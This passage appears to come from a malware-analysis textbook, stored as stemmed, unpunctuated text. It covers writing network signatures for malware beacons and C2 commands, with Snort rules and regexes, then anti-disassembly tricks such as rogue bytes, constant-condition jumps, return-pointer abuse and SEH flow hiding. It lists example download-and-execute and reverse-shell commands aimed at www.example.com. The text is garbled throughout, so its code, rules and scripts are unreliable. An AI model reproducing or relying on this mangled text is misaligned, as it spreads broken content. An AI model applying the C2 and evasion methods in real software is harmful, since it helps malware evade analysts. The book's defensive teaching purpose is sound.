evolut especi appar way malwar treat one common http field userag malwar first start mimick web request disguis traffic web browser userag field gener fix base browser variou instal compon here sampl userag string window host mozilla compat msie window nt net clr net clr net clr netc nete first gener malwar mimick web browser use complet manufactur userag string consequ malwar easili detect userag field alon next gener malwar includ measur ensur userag string use field common real network traffic made attack blend better network defend could still use static userag field creat effect signatur exampl gener popular userag string malwar might employ mozilla compat msie window nt next stage malwar introduc multiplechoic scheme malwar would includ sever userag fieldsal commonli use normal traffic would switch evad detect exampl malwar might includ follow userag string mozilla compat msie window nt sv mozilla compat msie window nt mozilla compat msie window nt net clr latest userag techniqu use nativ librari call construct request code browser use techniqu useragentstr malwar aspect request well indistinguish userag string browser attack use exist infrastructur attack leverag exist legitim resourc cloak malwar purpos server servic malwar request vulner detect server that also use legitim purpos attack may simpli use server mani differ purpos legitim use obscur malici use sinc investig ip address also reveal legitim use sophist approach emb command malwar legitim web page first line sampl page repurpos attack doctyp html public wcdtd xhtml stricten httpwwwworg trxhtmldtdxhtmlstrictdtd html xmlnshttpwwwworgxhtml xmllangen langen head meta httpequivcontenttyp contenttexthtml charsetutf titl roar capit seed stage ventur capit fund chicago titl meta propertyogtitl content roar capit seed stage ventur capit fund chicago meta propertyogsitenam contentroar capit adsrvbguznszwvw script typetextjavascript src js dotasticcustomjsscript oh third line bottom actual encod command malwar sleep long time check back base decod bguznszwvw longsleep malwar read command call sleep command sleep malwar process defend point view extrem difficult tell differ valid request real web page malwar make request interpret part web page command leverag clientiniti beacon one trend network design increas use network address translat nat proxi solut disguis host make outbound request request look like come proxi ip address instead attack wait request malwar likewis difficulti identifi whichinfect host commun one common malwar techniqu construct profil victim machin pass uniqu identifi beacon tell attack machin attempt initi commun commun handshak complet uniqu identif victim host take mani form includ encod string repres basic inform host hash uniqu host inform defend arm knowledg malwar identifi distinct host use inform identifi track infect machin understand surround code two type network activ send data receiv data analyz outgo data usual easier sinc malwar produc conveni sampl analysi whenev run well look two malwar sampl section first one creat send beacon get command infect websit follow excerpt traffic log hypothet piec malwar activ live network traffic log malwar appear make follow get request get http accept userag mozilla compat msie window nt host wwwbadsitecom connect keepal cachecontrol nocach run malwar lab environ sandbox notic malwar make follow similar request get http accept userag mozilla compat msie window nt host wwwbadsitecom connect keepal cachecontrol nocach use internet explor brows web page find standard user agent test system follow userag mozilla compat msie window nt sv net clr net clr given differ userag string appear malwar userag string hardcod unfortun malwar appear use fairli common userag string mean tri creat signatur static userag string alon like result numer fals posit posit side static userag string combin element creat effect signatur next step perform dynam analysi malwar run malwar coupl time describ previou section trial get request except uri differ time overal uri result yield follow actual traffic appear though might common charact middl string pattern easili discern static analysi use figur exactli request creat find network code first step evalu network commun actual find system call use perform commun common low level function part window socket winsock api malwar use api typic use function wsastartup getaddrinfo socket connect send recv wsagetlasterror malwar may altern use higherlev api call window internet wininet malwar use wininet api typic use function internetopen internetconnect internetopenurl httpopenrequest httpqueryinfo httpsendrequest internetreadfil internetwritefil higherlevel api allow malwar effect blend regular traffic sinc api use normal brows anoth highlevel api use network compon object model com interfac implicit use com function urldownloadtofil fairli common explicit use com still raremalwar use com explicitli typic use function like coiniti cocreateinst navig explicit use com creat use browser exampl allow malwar blend sinc actual use browser softwar intend also effect obscur activ connect network traffic tabl provid overview api call malwar might make implement network function tabl window network api winsock api wininet api com interfac wsastartup internetopen urldownloadtofil getaddrinfo internetconnect coiniti socket internetopenurl cocreateinst connect internetreadfil navig send internetwritefil recv httpopenrequest wsagetlasterror httpqueryinfo httpsendrequest return sampl malwar import function includ internetopen httpopenrequest suggest malwar use wininet api investig paramet internetopen see userag string hardcod malwar addit httpopenrequest take paramet specifi accept file type also see paramet contain hardcod content anoth httpopenrequest paramet uri path see content uri gener call gettickcount random gethostbynam know sourc network content element valuabl signatur gener hardcod data malwar network traffic sent malwar construct limit set origin sourc creat effect signatur requir knowledg origin piec network content follow fundamentalsourc random data data return call function produc pseudorandom valu data standard network librari get creat call httpsendrequest hardcod data malwar hardcod userag string data host configur hostnam current time accord system clock cpu speed data receiv sourc remot server file system exampl nonc sent server use encrypt local file keystrok captur keystrok logger note variou level encod impos data prior use network fundament origin determin use signatur gener hardcod data vs ephemer data malwar use lowerlevel network api winsock requir manual gener content mimic common traffic malwar use higherlevel network api like com interfac manual content mean hardcod data increas likelihood malwar author made mistak use gener signatur mistak obviou misspel mozilla mozila subtl miss space differ use case seen typic traffic mozilla sampl malwar mistak exist hardcod accept string string static defin instead usual recal uri gener exampl malwar follow form uri gener function call gettickcount random gethostbynam concaten string togeth malwar use colon charact hardcod accept string hardcod colon charact good candid inclus signatureth result call random account signatur though random valu could return result call gettickcount gethostbynam need evalu inclus base static result debug contentgener code sampl malwar see function creat string sent encod function format string sent seem follow random bytesfirst three byte hostnametim gettickcount hexadecim number appear simpl encod function take byte convert ascii decim form exampl charact becom clear difficult figur uri use dynam analysi sinc use random host attribut time encod formula chang length depend charact howev inform inform static analysi easili develop effect regular express uri identifi leverag encod step identifi stabl hardcod content alway simpl sinc transform occur data origin network traffic exampl instanc gettickcount command result hidden two layer encod first turn binari dword valu byte hex represent translat byte decim ascii valu final regular express follow tabl show correspond identifi data sourc final regular express use one previou exampl illustr transform tabl regular express decomposit sourc content random byte first byte hostnam time gettickcountx x xcd x l x x xcd x xa xd x xc xa x x x x x x x x let break see element target two fix colon separ three element pillar express byte identifi column tabl colon repres ascii decim represent raw static data invalu signatur creation initi random byte ultim translat decim number regular express cover number rang indic four copi pattern recal squar bracket contain symbol curli bracket contain number indic quantiti preced symbol pcre pipe symbol express logic one term parenthes may present express match also note case chose expand allow valu slightli avoid make regular express even complic alreadi knowledg process encod step allow identifi hardcod stabl element encod may restrict malwar send wire specif charact set field length therefor use focu signatur exampl even though initi content random know specif length know charact set overal length final encod layer restrict middl term sandwich valu first three charact hostnam field translat ascii decim equival pcre term match decim string six nine charact long rule hostnam contain singledigit ascii valu sinc nonprint charact left minimum bound three charact minimum length decim valu instead import focu avoid ephemer element signatur includ hardcod data observ previou section dynam analysi infect system hostnam may appear consist host signatur use element fail trigger infect host case took advantag length encod restrict actual content third part express cover possibl valu charact repres uptim system determin call gettickcount result gettickcount command dword translat hex ascii decim represent valu gettickcount command around three day uptim hex represent would xfff thu number repres ascii decim lowercas letter limit f repres ascii decim seen term count match number hex charact express contain logic cover appropri number rang sourc data may initi appear random therefor unus portion data may actual predict time one exampl sinc highord bit remain rel fix sometim provid stabl enough sourc data use signatur tradeoff perform accuraci construct effect signatur exampl regular express one expens test id use uniqu fixedcont string dramat improv contentbas search particular exampl challeng fix content avail short term strategi could use creat effect signatur case could combin uri regular express fix userag string regular express would use unless specif userag string present assum want signatur uri target two term two content express keyword ensur limitednumb byte search first instanc found content content distanc within within keyword limit number charact search upper bit gettickcount call rel fix opportun combin upper bit neighbor exampl sampl run follow repres signific digit analyz time involv find signific digit first three day uptim next three day live danger mix differ content express use initi filter cover uptim month obvious import pay attent content malwar observ also import identifi case content exist use type error malwar author make especi use low level api forget includ item commonli present regular traffic refer sic field exampl often present normal web brows activ includ malwar absenc part signatur often make differ signatur success one result mani fals posit creat signatur follow propos snort signatur sampl malwar combin mani differ factor cover far static userag string unusu accept string encod colon uri miss referr get request match regular express describ previous alert tcp homenet externalnet httpport msgtrojan malici beacon contentuserag mozilla compat msie window nt contentaccept uricont contentdarefer nocas pcre get http classtypetrojanact sid rev note typic analyst first learn write network signatur focu creat signatur work howev ensur signatur effici also import chapter focus identifi element good signatur spend much time optim exampl signatur ensur good performanceanalyz pars routin note earlier would look commun two direct far discuss analyz traffic malwar gener inform malwar traffic receiv also use gener signatur exampl consid piec malwar use comment field web page retriev next command strategi discuss briefli earlier chapter malwar make request web page site attack compromis search hidden messag embed web page assum addit malwar also network traffic show web server respons malwar compar string malwar web page see common term adsrv web page return singl line look like adsrvbguznszwvw fairli innocu comment within web page unlik attract much attent might tempt creat network signatur base observ traffic would result incomplet solut first two question must answer command might malwar understand malwar identifi web page contain command alreadi seen adsrv string appear malwar would excel signatur element strengthen signatur ad element find potenti addit element first look network routin page receiv see function that call receiv input probabl pars function figur show ida pro graph sampl pars routin look comment field web page design typic custom pars function often use malwar instead someth like regular expressionlibrari custom pars routin gener organ cascad pattern test initi charact small test block one line cascad next block anoth line go failur block contain option loop back start line form upper loop left figur show current line fail test next line tri sampl function doubl cascad loop structur second cascad look charact close comment field individu block cascad show charact function seek case charact first loop second block cascad function call test content come thu command process content middl match intern function side comment enclosur intact figur ida pro graph sampl pars function dig deeper intern pars function find first check adsrv string present attack place command malwar question mark comment closur perform simpl base convers command provid rudimentari obfusc pars function base convers interpret result command command analysi perform later code pars complet malwar accept five command three tell malwar sleep differ length time two allow attack conduct next stage attack tabl show sampl command malwar might receiv along base translat tabl sampl malwar command command exampl base translat oper longsleep bguznszwvw sleep hour superlongsleep cvwzxjsbncxlzxa sleep hour shortsleep chvcnrzbgvlca sleep minut runwwwexamplecomfastex cnvuonddylegftcgxllmnvbsmyxnlmvzq download execut binari local system connectwwwexamplecom yubmvjddpdcuzxhhbxbszsjboda use custom protocol establish revers shell one approach creat signatur backdoor target full set ofcommand known use malwar includ surround context content express five command recogn malwar would contain follow string adsrvbguznszwvw adsrvcvwzxjsbncxlzxa adsrvchvcnrzbgvlca adsrvcnvu adsrvyubmvj last two express target static part command run connect sinc length argument known target trail comment charact signatur use element like find precis piec malwar risk specif expens robust attack chang part malwareth command set encod command prefixa precis signatur ceas effect target multipl element previous saw differ part command interpret differ part code given knowledg creat differ signatur target variou element separ three element appear distinct function comment bracket fix adsrv base express follow actual command pars base three element set signatur element could includ follow breviti primari element signatur includ line repres differ signatur pcre adsrvazaz content contentbguznszwvw within content contentcvwzxjsbncxlzxa within content contentchvcnrzbgvlca within content contentcnvuwithincont within content contentyubmvj within content within signatur target three differ element make command sent malwar includ comment bracket first signatur target command prefix adsrv follow gener baseencod command rest signatur target known baseencod command without depend command prefixsinc know pars occur separ section code make sens target independ attack chang one part code signatur still detect unchang part note still make assumpt new signatur may prone fals posit also assum attack like continu use comment bracket sinc comment bracket part regular web commun unlik consid suspici nevertheless strategi provid robust coverag initi attempt like detect futur variant malwar let revisit signatur creat earlier beacon traffic recal combin everi possibl element signatur alert tcp homenet externalnet httpport msgtrojan malici beacon contentuserag mozilla compat msie window nt contentaccept uricont contentdarefer nocas pcre get http classtypetrojanact sid rev signatur limit scope would becom useless attack made chang malwar way address differ element individu avoid rapid obsolesc two target target userag string accept string referr target specif uri referr strategi would yield two signatur alert tcp homenet externalnet httpport msgtrojan malici beacon ua accept anomali contentuserag mozilla compat msie window nt contentaccept contentdarefer nocas classtypetrojanact sid rev alert tcp homenet externalnet httpport msgtrojan malici beacon uri uricont contentdarefer nocas pcre get http classtypetrojanact sid revunderstand attack perspect design signatur strategi wise tri understand attack perspect attack play constant game catandmous intent blend regular traffic avoid detect maintain success ongo oper like softwar develop attack struggl updat softwar remain current compat chang system chang necessari minim larg chang threaten integr system previous discuss use multipl signatur target differ part malici code make detect resili attack modif often attack chang softwar slightli avoid detect specif signatur creat multipl signatur key differ aspect commun still success detect malwar even attack updat portion code three addit rule thumb use take advantag attack weak focu element protocol part end point chang either client code server code alon much easier chang look element protocol use code client server side creat signatur base element attack need lot extra work render signatur obsolet focu element protocol known part key often hardcod compon protocol use key exampl attack may use specif userag string authent key illegitim probe detect possibl rerout order attack bypass signatur would need chang code end point identifi element protocol immedi appar traffic sometim simultan action multipl defend imped detect malwar anoth defend creat signatur achievessuffici success attack attack may compel adjust malwar avoid signatur reli signatur signatur target aspect attack commun protocol attack adjust affect signatur well order avoid render obsolet attack respons anoth defend tri identifi aspect malici oper defend might focus knowledg gain care observ malwar help develop robust signatureconclus chapter weve describ way malwar use network command control weve also cover techniqu malwar use disguis activ look like regular network traffic malwar analysi improv effect network defens provid insight signaturegener process weve describ sever advantag base network signatur deeper malwar analysi rather surfac analysi exist traffic captur sandboxbas analysi signatur base malwar analysi precis reduc trial error need produc low falseposit signatur addit higher likelihood identifi new strain malwar chapter address often endgam basic malwar analysi develop effect countermeasur protect futur malwar howev chapter assum possibl achiev good understand malwar dynam static analys case malwar author take activ measur prevent effect analysi next set chapter explain techniqu malwar author use stymi analysi step take ensur fulli decompos understand malwar questionlab chapter lab focu identifi network compon malwar degre lab build chapter sinc develop network signatur youll often need deal encod content lab analyz malwar found file labex program harm system question q network librari malwar use advantag q sourc element use construct network beacon condit would caus beacon chang q might inform embed network beacon interest attack q malwar use standard base encod encod unusu q overal purpos malwar q element malwar commun may effect detect use network signatur q mistak might analyst make tri develop signatur malwar q set signatur would detect malwar futur variant lab analyz malwar found file labex malwar configur beacon hardcod loopback address order prevent harm system imagin hardcod extern address question q advantag disadvantag code malwar use direct ip address q network librari malwar use advantag disadvantag use librariesq sourc url malwar use beacon advantag sourc offer q aspect http protocol malwar leverag achiev object q kind inform commun malwar initi beacon q disadvantag design malwar commun channel q malwar encod scheme standard q commun termin q purpos malwar role might play attack arsen lab lab build lab solut imagin malwar attempt attack improv techniqu analyz malwar found file lab exe question q hardcod element use initi beacon element would make good signatur q element initi beacon may conduc longlast signatur q malwar obtain command exampl chapter use similar methodolog advantag techniqu q malwar receiv input check perform input determin whether valid command attack hide list command malwar search q type encod use command argument differ base advantag disadvantag offer q command avail malwar q purpos malwar q chapter introduc idea target differ area code independ signatur possibl order add resili network indic distinct area code configur data target network signatur q set signatur use malwarepart v antireverseengineeringchapt antidisassembl antidisassembl use special craft code data program caus disassembl analysi tool produc incorrect program list techniqu craft malwar author manual separ tool build deploy process interwoven malwar sourc code malwar design particular goal mind keystrok log backdoor access use target system send excess email crippl server malwar author often go beyond basic function implement specif techniqu hide user system administr use rootkit process inject otherwis thwart analysi detect malwar author use antidisassembl techniqu delay prevent analysi malici code code execut success reverseengin armor code antidisassembl antidebug techniqu malwar author increas level skill requir malwar analyst timesensit investig process hinder malwar analyst inabl understand malwar capabl deriv valuabl host network signatur develop decod algorithm addit layer protect may exhaust inhous skill level mani organ requir expert consult larg research project level effort reverseengin addit delay prevent human analysi antidisassembl also effect prevent certain autom analysi techniqu mani malwar similar detect algorithm antiviru heurist engin employ disassembl analysi identifi classifi malwar manual autom process use individu program instruct suscept antianalysi techniqu describ chapter understand antidisassembl disassembl simpl problem sequenc execut code multipl disassembl represent may invalid obscur real function program implement antidisassembl malwar author creat sequenc trick disassembl show listof instruct differ execut antidisassembl techniqu work take advantag assumpt limit disassembl exampl disassembl repres byte program part one instruct time disassembl trick disassembl wrong offset valid instruct could hidden view exampl examin follow fragment disassembl code jmp short near ptr loc loc code xref segj call near ptr ffah ecx dl inc eax db fragment code disassembl use lineardisassembl techniqu result inaccur read code miss piec inform author tri hide see appear call instruct target call nonsens first instruct jmp instruct whose target invalid fall middl next instruct examin sequenc byte disassembl differ strategi jmp short loc db eh loc code xref segj push ah call sleep fragment reveal differ sequenc assembl mnemon appear inform see call api function sleep target first jmp instruct properli repres see jump push instruct follow call sleep byte third line exampl xe byte execut program jmp instruct skip fragment disassembl flowori disassembl rather linear disassembl use previous case flowori disassembl accur logic close mirror real program attempt disassembl byte part execut flow welldiscuss linear flowori disassembl detail next section disassembl simpl may thought disassembl exampl show two complet differ set instruct set byte demonstr antidisassembl caus disassembl produc inaccur set instruct given rang byte antidisassembl techniqu gener enough work disassembl target specif productsdef disassembl algorithm antidisassembl techniqu born inher weak disassembl algorithm disassembl must make certain assumpt order present code disassembl clearli assumpt fail malwar author opportun fool malwar analyst two type disassembl algorithm linear flowori linear disassembl easier implement also errorpron linear disassembl lineardisassembl strategi iter block code disassembl one instruct time linearli without deviat basic strategi employ disassembl write tutori wide use debugg linear disassembl use size disassembl instruct determin byte disassembl next without regard flowcontrol instruct follow code fragment show use disassembl librari libdisasm httpsfnetprojectsbastardfileslibdisasm implement crude disassembl hand line c use linear disassembl char bufferbufs int posit posit bufsiz xinsnt insn int size xdisasmbuf bufsiz posit insn size char disassemblylin xformatinsninsn disassemblylin intelsyntax printfsn disassemblylin posit size els invalidunrecogn instruct posit xcleanup exampl buffer data name buffer contain instruct disassembl function xdisasm popul data structur specif instruct disassembl return size instruct loop increment posit variabl size valu avalid instruct disassembl otherwis increment one algorithm disassembl code without problem introduc occasion error even nonmalici binari main drawback method disassembl much code algorithm keep blindli disassembl end buffer even flowcontrol instruct caus small portion buffer execut peformat execut file execut code typic contain singl section reason assum could get away appli lineardisassembl algorithm text section contain code problem code section nearli binari also contain data isnt instruct one common type data item found code section pointer valu use tabledriven switch idiom follow disassembl fragment nonlinear disassembl show function contain switch pointer immedi follow function code jmp dsoffeax switch jump switch case omit xor eax eax pop esi retn dd offset loc data xref mainr dd offset loc jump tabl switch statement dd offset loce dd offset loc last instruct function retn memori byte immedi follow retn instruct pointer valu begin memori appear byte sequenc hex four pointer valu shown code fragment make byte data insid text section binari also happen disassembl valid instruct follow disassembl fragment would produc lineardisassembl algorithm continu disassembl instruct beyond end function eaxdl inc eax add ediah adc eaxxaladc cseaxxal xor eaxx mani instruct fragment consist multipl byte key way malwar author exploit lineardisassembl algorithm lie plant data byte form opcod multibyt instruct exampl standard local call instruct byte begin opcod xe byte data compos switch tabl end valu xe disassembl would encount call instruct opcod treat next byte operand instruct instead begin next function lineardisassembl algorithm easiest defeat unabl distinguish code data flowori disassembl advanc categori disassembl algorithm flowori disassembl method use commerci disassembl ida pro key differ flowori linear disassembl disassembl doesnt blindli iter buffer assum data noth instruct pack neatli togeth instead examin instruct build list locat disassembl follow fragment show code disassembl correctli flowori disassembl test eax eax jz short loca push failedstr call printf jmp short locd failedstr db fail loca xor eax eax locd retn exampl begin test condit jump flowori disassembl reach condit branch instruct jz note point futur need disassembl locat loca condit branch instruct also possibl inexecut disassembl disassembl well line respons print string fail screen follow jmp instruct flowori disassembl add target locd list place disassembl futur sinc jmp uncondit disassembl automat disassembl instruct immedi follow memori instead step back check list place note previous loca disassembl start point contrast linear disassembl encount jmp instruct continu blindli disassembl instruct sequenti memori regardless logic flow code case fail string would disassembl code inadvert hide ascii string last two instruct exampl fragment exampl follow fragment show code disassembl lineardisassembl algorithm test eax eax jz short near ptr loc push failedstr call printf jmp short loc failedstr inc esi popa loc imul ebp ebph cch linear disassembl disassembl choic make instruct disassembl given time flowori disassembl make choic assumpt though assumpt choic might seem unnecessari simpl machin code instruct complic addit problemat code aspect pointer except condit branch condit branch give flowori disassembl choic two place disassembl true fals branch typic compilergener code would differ output disassembl process true fals branch first handwritten assembl code antidisassembl code howev two branch often produc differ disassembl block code conflict disassembl trust initi interpret given locat first flowori disassembl process thu trust fals branch condit jump firstfigur show sequenc byte correspond machin instruct notic string hello middl instruct program execut string skip call instruct byte null termin never execut instruct figur call instruct follow string call instruct anoth place disassembl must make decis locat call ad futur disassembl list along locat immedi call condit jump instruct disassembl disassembl byte call instruct first call locat later handwritten assembl programm often use call instruct get pointer fix piec data instead actual call subroutin exampl call instruct use creat pointer string hello stack pop instruct follow call take valu top stack put regist eax case disassembl binari ida pro see produc disassembl expect e call near ptr locca c c f push fcch locca c add eaxdh bl turn first letter string hello letter h x hexadecim also opcod byte instruct push dword null termin hello string turn also first byte anoth legitim instruct flowori disassembl ida pro decid process thread disassembl immedi follow call instruct process target call instruct thu produc two erron instruct process target first still would haveproduc first push instruct instruct follow push would conflict real instruct disassembl result call target ida pro produc inaccur result manual switch byte data instruct instruct data use c key keyboard follow press c key turn cursor locat code press key turn cursor locat data function manual cleanup e call loccb c c f ahello db hello loccb pop eax c retnantidisassembl techniqu primari way malwar forc disassembl produc inaccur disassembl take advantag disassembl choic assumpt techniqu examin chapter exploit basic assumpt disassembl typic easili fix malwar analyst advanc techniqu involv take advantag inform disassembl typic doesnt access well gener code imposs disassembl complet convent assembl list jump instruct target common antidisassembl techniqu seen wild two backtoback condit jump instruct point target exampl jz loc follow jnz loc locat loc alway jump combin jz jnz effect uncondit jmp disassembl doesnt recogn disassembl one instruct time disassembl encount jnz continu disassembl fals branch instruct despit fact never execut practic follow code show ida pro first interpret piec code protect techniqu jz short near ptr locc jnz short near ptr locc locc code xref subc subcj e c call near ptr ddh exampl instruct immedi follow two condit jump instruct appear call instruct begin byte xe case howev condit jump instruct actual point byte beyond xe byte fragment view ida pro code crossrefer shown locc appear red rather standard blue actual refer point insid instruct locat instead begin instruct malwar analyst first indic antidisassembl may employ sampl analyzingth follow disassembl code time fix key turn byte immedi follow jnz instruct data c key turn byte locc instruct jz short near ptr locc jnz short near ptr locc e db eh locc code xref subc subcj pop eax c retn column left exampl show byte constitut instruct display field option import learn anti disassembl display byte turn select option gener number opcod byte option allow enter number mani byte would like display figur show sequenc byte exampl graphic figur jz instruct follow jnz instruct jump instruct constant condit anoth antidisassembl techniqu commonli found wild compos singl condit jump instruct place condit alway follow code use techniqu c xor eax eax jz short near ptr locc locc code xref cj data xref rdataaco e c jmp near ptr adh notic code begin instruct xor eax eax instructionwil set eax regist zero byproduct set zero flag next instruct condit jump jump zero flag set realiti condit sinc guarante zero flag alway set point program discuss previous disassembl process fals branch first produc conflict code true branch sinc process fals branch first trust branch youv learn use key keyboard cursor line code turn code data press c key turn data code use two keyboard shortcut malwar analyst could fix fragment show real path execut follow c xor eax eax jz short near ptr locc e db eh locc code xref cj data xref rdataaco pop eax c retn exampl xe byte use exactli xe byte previou exampl e opcod byte jmp instruct e opcod byte call instruct case trick disassembl disassembl locat byte follow opcod effect hidden view figur show exampl graphic figur fals condit xor follow jz instruct imposs disassembl previou section examin code improperli disassembl first attempt made disassembl interact disassembl likeida pro abl work disassembl produc accur result howev condit tradit assembl list accur repres instruct execut use term imposs disassembl condit term isnt strictli accur could disassembl techniqu would need vastli differ represent code current provid disassembl simpl antidisassembl techniqu discuss use data byte place strateg condit jump instruct idea disassembl start byte prevent real instruct follow disassembl byte insert opcod multibyt instruct well call rogu byte part program code throw disassembl exampl rogu byte ignor rogu byte cant ignor part legitim instruct actual execut runtim encount tricki scenario given byte may part multipl instruct execut disassembl current market repres singl byte part two instruct yet processor limit figur show exampl first instruct byte sequenc byte jmp instruct target jump second byte doesnt caus error byte ff first byte next byte instruct inc eax figur inwardpoint jmp instruct predica tri repres sequenc disassembl choos repres ff byte part jmp instruct wont avail shown begin inc eax instruct ff byte apart instruct actual execut modern disassembl way repres byte sequenc increment eax decrement effect complic nop sequenc could insert almost locat within program break chain valid disassembl solv problem malwar analyst could choos replac entir sequenc nop instruct use idc idapython script call patchbyt function anoth altern simpli turn data key disassembl resum expect end byte glimps complex achiev sort instruct sequenc let examin advanc specimen figur show exampl oper principl prior one byte part multipl instruct figur multilevel inwardjump sequenc first instruct sequenc byte mov instruct last byte highlight part instruct also instruct execut later first instruct popul ax regist data second instruct xor zero regist set zero flag third instruct condit jump jump zero flag set actual uncondit sinc previou instruct alway set zero flag disassembl decid disassembl instruct immedi follow jz instruct begin byte xe opcod byte call instruct instruct begin byte e never execut realiti disassembl scenario cant disassembl target jz instructionbecaus byte alreadi accur repres part mov instruct code jz point alway execut sinc zero flag alway set point jz instruct point middl first byte mov instruct last byte instruct operand move regist disassembl execut form jmp instruct jump forward byte end instruct first view ida pro sequenc look like follow b eb mov ax ebh c xor eax eax f jz short near ptr subc locc e c call near ptr adh sinc way clean code execut instruct repres must choos instruct leav net side effect antidisassembl sequenc eax regist set zero manipul code c key ida pro instruct visibl xor instruct hidden instruct result look like follow bytec db h b db bh eb db ebh db c xor eax eax db h f db fh e db eh pop eax c retn somewhat accept solut show instruct relev understand program howev solut may interfer analysi process graph sinc difficult tell exactli xor instruct pop retn sequenc execut complet solut would use patchbyt function idc script languag modifi remain byte appear nop instruct exampl two area undisassembl byte need convert nop instruct byte start memori address xc bytesstart memori address xc follow idapython script convert byte nop byte x def nopbytesstart length rang length patchbytestart x makecodestart nopbytesxc nopbytesxc code take long approach make util function call nopbyt nopout rang byte use util function two rang need fix script execut result disassembl clean legibl logic equival origin nop nop nop nop c xor eax eax nop nop nop pop eax c retn idapython script craft work beauti scenario limit use appli new challeng reus previou script malwar analyst must decid offset length byte chang nop instruct manual edit script new valu nope instruct ida pro littl ida python knowledg develop script allow malwar analyst easili nopout instruct see fit follow script establish hotkey alt n script execut whenev user press alt n ida pro nopout instruct current cursor locat also conveni advanc cursor next instruct facilit easi nopout larg block code import idaapi idaapicompilelinestat nkey runpythonstatementnopit addhotkeyaltn nkey def nopit start screenea end nextheadstart ea rangestart end patchbyteea x jumpend refreshobscur flow control modern disassembl ida pro excel job correl function call deduc highlevel inform base knowledg function relat type analysi work well code written standard program style standard compil easili defeat malwar author function pointer problem function pointer common program idiom c program languag use extens behind scene c despit still prove problemat disassembl use function pointer intend fashion c program greatli reduc inform automat deduc program flow function pointer use handwritten assembl craft nonstandard way sourc code result difficult reverseengin without dynam analysi follow assembl list show two function second function use first function pointer c subc proc near data xref subdo c c arg dword ptr c c push ebp c mov ebp esp c mov eax ebparg c shl eax c pop ebp ca retn ca subc endp subd proc near code xref mainp sub bp var dword ptr arg dword ptr push ebp mov ebp esp push ecx push esi mov ebpvar offset subc dc push ahd call ebpvar e add esp e mov esi eax e mov eax ebparg e push eax ea call ebpvar ed add esp f lea eax esieax f pop esi f mov esp ebp f pop ebp f retn f subd endp exampl isnt particularli difficult reverseengin expos one key issu function subc actual call two differ place within subd function show one cross refer ida pro abl detect initi refer function offset load stack variabl line ida pro detect howev fact function call twice locat function prototyp inform would normal autopropag call function also lost use extens combin antidisassembl techniqu function pointer greatli compound complex difficulti revers engin ad miss code crossrefer ida pro inform autopropag upward function argument name ad manual comment malwar analyst order add actual crossrefer must use idc languag idapython tell ida pro function subc actual call two locat function idc function use call addcodexref take three argument locat refer locat refer flow type function support sever differ flow type purpos use either flcf normal call instruct fljf jump instruct fix previou exampl assembl code list ida pro follow script executedaddcodexrefxd xc flcf addcodexrefxea xc flcf return pointer abus call jmp instruct instruct transfer control within program counterpart call instruct retn also repres ret call instruct act like jmp instruct except push return pointer stack return point memori address immedi follow end call instruct call combin jmp push retn combin pop jmp retn instruct pop valu top stack jump typic use return function call architectur reason cant use gener flow control retn instruct use way return function call even intellig disassembl left dark obviou result techniqu disassembl doesnt show code crossrefer target jump anoth key benefit techniqu disassembl prematur termin function let examin follow assembl fragment c subc proc near code xref mainp c sub bp c c var byte ptr c c call c add espvar c retn c subc endp spanalysi fail c ca ca push ebp cb mov ebp esp cd mov eax ebp imul eax ah mov esp ebp pop ebp retn simpl function take number return product number time unfortun ida pro unabl deduc meaning inform function defeat rogu retn instruct notic detect presenc argument thisfunct first three instruct accomplish task jump real start function let examin instruct first instruct function call instruct simpli call locat immedi follow result pointer memori locat place stack specif exampl valu xc place top stack instruct execut common instruct found code need selfreferenti posit independ cover detail chapter next instruct add espvar use read ida pro disassembl might think instruct referenc stack variabl var case ida pro stackfram analysi incorrect instruct referenc would normal stack variabl autonam var ordinari function may seem confus first notic top function var defin constant mean insid bracket esp also repres esp simpli esp instruct ad five valu top stack xc result addit instruct valu top stack xca last instruct sequenc retn instruct sole purpos take valu stack jump examin code locat xca appear legitim begin rather normallook function real function determin ida pro part function due presenc rogu retn instruct repair exampl could patch first three instruct nop instruct adjust function boundari cover real function adjust function boundari place cursor ida pro insid function wish adjust press alt p adjust function end address memori address immedi follow last instruct function replac first instruct nop refer script techniqu describ nope instruct ida pro misus structur except handlersth structur except handl seh mechan provid method flow control unabl follow disassembl fool debugg seh featur x architectur intend provid way program handl error condit intellig program languag c ada reli heavili except handl translat natur seh compil x system explor har seh obscur flow control let look basic concept oper except trigger number reason access invalid memori region divid zero addit softwar except rais call raiseexcept function seh chain list function design handl except within thread function list either handl except pass next handler list except make way last handler consid unhandl except last except handler piec code respons trigger familiar messag box inform user unhandl except occur except happen regularli process handl silent make final state crash process inform user find seh chain os examin fs segment regist regist contain segment selector use gain access thread environ block teb first structur within teb thread inform block tib first element tib consequ first byte teb pointer seh chain seh chain simpl link list byte data structur call exceptionregistr record struct except registr dword prev dword handler first element exceptionregistr record point previou record second field pointer handler function link list oper conceptu stack first record call last record ad list seh chain grow shrink layer except handler program chang due subroutin call nest except handler block reason seh record alway built thestack order use seh achiev covert flow control need concern mani except record current chain need understand add handler top list shown figur figur structur except handl seh chain add record list need construct new record stack sinc record structur simpli two dword two push instruct stack grow upward first push pointer handler function second push pointer next record tri add record top chain next record chain finish current top point fs follow code perform sequenc push exceptionhandl push fs mov fs esp exceptionhandl function call first whenev except occur action subject constraint impos microsoft softwar data execut prevent softwar dep also known safeseh softwar dep secur featur prevent addit thirdparti except handler runtim purpos handwritten assembl code sever way work around technolog use assembl support safeseh direct use microsoft c compil author add safesehno linker command line disabl exceptionhandl code call stack drastic alter luckili essenti purpos fulli examin data isad stack point must simpli understand return stack origin posit prior except rememb goal obscur flow control properli handl program except os add anoth seh handler handler call return program normal oper need unlink handler handler well therefor need pull origin stack pointer esp instead esp mov esp esp mov eax fs mov eax eax mov eax eax mov fs eax add esp let bring knowledg back origin goal obscur flow control follow fragment contain piec code visual c binari covertli transfer flow subroutin sinc pointer function disassembl doesnt understand seh appear though subroutin refer disassembl think code immedi follow trigger except execut mov eax offset locb add eax h push eax push larg dword ptr fs dwmillisecond mov larg fs esp xor ecx ecx div ecx b b locb data xref subo b call near ptr sleep retn sub endp spanalysi fail align h dd bh ah bh abh dd ch dd offset amysterycod mysteri code c dd deh ch dupcccccccch exampl ida pro miss fact subroutin locat call also fail even disassembl function code set except handler covertli first set regist eax valu c ad h build pointer function dividebyzero except trigger set ecx tozero xor ecx ecx follow div ecx divid eax regist ecx let use c key ida pro turn data locat code see hidden use trick mov esp esp mov eax larg fs mov eax eax c mov eax eax e mov larg fs eax add esp push offset amysterycod mysteri code c call printfthwart stackfram analysi advanc disassembl analyz instruct function deduc construct stack frame allow display local variabl paramet relev function inform extrem 